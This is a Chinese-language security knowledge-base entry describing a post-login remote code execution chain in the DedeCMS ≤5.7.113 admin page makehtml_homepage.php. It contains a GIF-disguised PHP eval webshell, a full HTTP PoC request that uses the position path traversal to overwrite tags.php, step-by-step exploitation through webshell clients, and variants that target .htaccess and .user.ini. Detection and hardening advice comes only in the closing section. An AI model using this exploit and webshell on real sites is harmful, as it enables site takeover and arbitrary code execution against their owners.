---
id: web-php-rce-dedecms-makehtml-homepage-position-file-write
title: DedeCMS ≤5.7.113 后台 makehtml_homepage.php：position 路径穿越 + 模板内容回写覆盖 tags.php getshell
type: scenario
domain: web
path: web/php/rce
technique: dedecms-makehtml-homepage-position-path-overwrite
tags:
- php
- dedecms
- cms
- rce
- file-write
- path-traversal
- template
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: DeDeCMS <=5.7.113
verification:
  verified_by: verifier-T1-19
  verified_at: '2026-11-08T12:08:23+08:00'
  notes: 已对照原文核对：img04/05 代码与请求包 dopost=make&templet=mu.gif&position=../tags.php&showmod=1 一致，img13/15 确认 mu.gif 含<?php eval([a])?>且 tags.php 被覆盖，img17 phpinfo 执行、img19 蚁剑连接成功，链条完整。affected_versions=DeDeCMS <=5.7.113 来自原文「影响版本」节原文标注。未验证点：PoC 未在本机复现。
url: /docs/web/php/rce/web-php-rce-dedecms-makehtml-homepage-position-file-write/
draft: false
kb_aliases:
- DedeCMS 任意文件覆盖
- makehtml_homepage.php 任意文件写入
- DedeCMS 后台 getshell
- SetTemplet SaveToHtml 文件覆盖
- position 参数穿越
---

## 一句话结论

DedeCMS 后台的「生成首页」功能把模板文件内容原样读取后写入 `position` 指定的路径，而 `position` 完全不做过滤（只把 `\` 和 `//` 归一化，`../` 仍可用），因此登录后台后先用文件管理器把一句话木马存成 `/dede/templets/` 下的 GIF 图片马，再请求 `dopost=make&showmod=1&templet=mu.gif&position=../tags.php`，即可把图片马内容覆盖到站点根目录的 `tags.php`，访问即执行任意 PHP 代码。影响 DeDeCMS ≤ 5.7.113。

## 原理

- **两个参数一个写一个读**：`/dede/makehtml_homepage.php` 的 `$dopost=="make"` 分支先算 `$homeFile = DEDEADMIN."/".$position`，用 `fopen($homeFile,"w")` 创建/清空文件；随后在 `$showmod==1`（生成静态）时把 `$templet` 交给 `PartView::SetTemplet()` 读取模板，再 `SaveToHtml($homeFile)` 写回同一个路径。即「读 A 文件内容、写到 B 路径」，A 与 B 都由请求控制。
- **position 无过滤**：代码只做 `str_replace("\\","/")` 与 `str_replace("//","/")`，这两步是路径归一化，不阻止 `..`。`DEDEADMIN` 是 `/dede` 绝对路径，故 `position=../tags.php` 解析为站点根目录的 `tags.php`，`position=../1.php` 可在根目录新建文件（`fopen(...,"w")` 对不存在的文件会创建）。
- **templet 只挡了穿越**：文件开头 `$templet = preg_replace("/[.]+[\/\\\\]+/", "/", $templet)` 把 `../`、`.../` 之类折叠成 `/`，所以 `templet` 不能跳出模板目录，只能在 `$cfg_basedir.$cfg_templets_dir`（`/dede/templets/`）下选文件。攻击者需要的正是「目录内可控内容」——文件管理器允许上传图片到该目录且不校验内容。
- **内容为什么原样落盘**：`SetTemplet($temp)` → `LoadTemplet` → `LoadTemplate` 逐行 `fgets` 拼进 `$this->SourceString`；`SaveToHtml` → `SaveTo` → `fwrite($fp,$this->GetResult())`；而 `GetResult()` 在 `$this->Count==-1`（没有解析到任何模板标签）时直接 `return $this->SourceString`，即整份文件字节原样写出，不做转义或过滤。
- **图片马可行**：文件管理器按扩展名判定类型，`.gif` 可上传；内容以 `GIF89a` 开头再拼 `<?php ... ?>`，PHP 解释器在遇到 `<?php` 前的 GIF 字节时当作 HTML 输出，不影响后续代码执行。
- **为什么是 RCE 而非仅覆盖**：覆盖目标选的是 Web 根目录下会被 PHP 解析的 `.php`（如 `tags.php`），写入内容是合法 PHP 代码，请求该 URL 即由 PHP-FPM/Apache 执行，形成完整链条且不依赖其他漏洞。

## 触发条件

- 目标为 DedeCMS ≤ 5.7.113，攻击者已取得后台账号（后台功能本身就要求管理员权限）。
- `dede/templets/` 可写且能通过「模块 → 文件管理器」上传图片文件（默认后台具备该功能）。
- 站点根目录存在可覆盖的 `.php` 文件（`tags.php`、`index.php` 均可），且 Web 进程对目标路径有写权限。

## 利用步骤

1. 登录后台，进入「模块 → 文件管理器」，定位到 `/dede/templets/`。
2. 上传内容为 `GIF89a` + `<?php @eval($_POST['a']);?>` 的文件，命名 `mu.gif`（扩展名保持图片以免被拦截）。
3. 确认 `/dede/makehtml_homepage.php` 可访问且当前会话 CSRF token 有效。
4. 发送 `dopost=make&templet=mu.gif&position=..%2Ftags.php&showmod=1`。
5. 页面回显「成功更新主页 HTML」后，访问 `/tags.php`，POST `a=phpinfo();` 验证执行。
6. 用冰蝎/蚁剑等客户端连接该 URL 获取交互式 shell。
7. 若 `tags.php` 不可写，换 `position=../1.php` 新建文件，再访问 `/1.php`。

## PoC

```http
POST /dede/makehtml_homepage.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<admin-session>; DedeUserID=1; DedeLoginTime=<ts>

dopost=make&templet=mu.gif&position=..%2Ftags.php&showmod=1
```

```text
# 前置：/dede/templets/mu.gif 内容
GIF89a<?php @eval($_POST['a']);?>
# 触发后访问 http://target/tags.php，POST a=phpinfo();
```

## 变体与关联

- 变体：`position` 可指向任意可写 `.php`（`index.php`、`plus/xxx.php`），也可指向 `.htaccess`、`.user.ini` 做配置级利用；目标目录越靠近 Web 根，利用越直接。
- 变体：`templet` 也可选模板目录中已有的、内容可控的文件（如被其他上传功能写入的模板缓存），省掉自己上传图片马这一步。
- 关联：[[web-php-rce-dedecms-template-tag-source-substr-replace-waf-bypass]]（同为 DedeCMS 后台写 PHP，但入口是标签源码编辑器）、[[web-php-rce-dedecms-homepageset-task-do-stored-file-write]]（同一 sink 的二阶存储型变体，影响 ≤5.7.115）、[[web-generic-file-upload-dedecms-template-rename-php-waf-fileread]]（模板上传改名）。

## 检测与防御

- 检测：`/dede/makehtml_homepage.php` 出现带 `position` 且含 `..`、`%2f` 的请求；`dede/templets/` 下新增非模板扩展名文件；站点根目录 `.php` 文件 mtime 突变且内容以图片魔数开头；后台账号在短时间内完成「上传图片 + 生成首页」。
- 防御：`position` 只接受白名单文件名（如固定 `index.html`），落盘前用 `realpath()` 校验目标必须位于允许目录内；禁止后台把任意模板内容写出到可执行目录；文件管理器对上传内容做魔数与图片解码校验、禁止在模板目录写非模板文件；升级到官方修复版本。
- 加固：`open_basedir` 限制后台进程可写范围；Web 目录对 PHP 进程只给最小写权限；对 `dede/` 后台加 IP 白名单与二次认证。
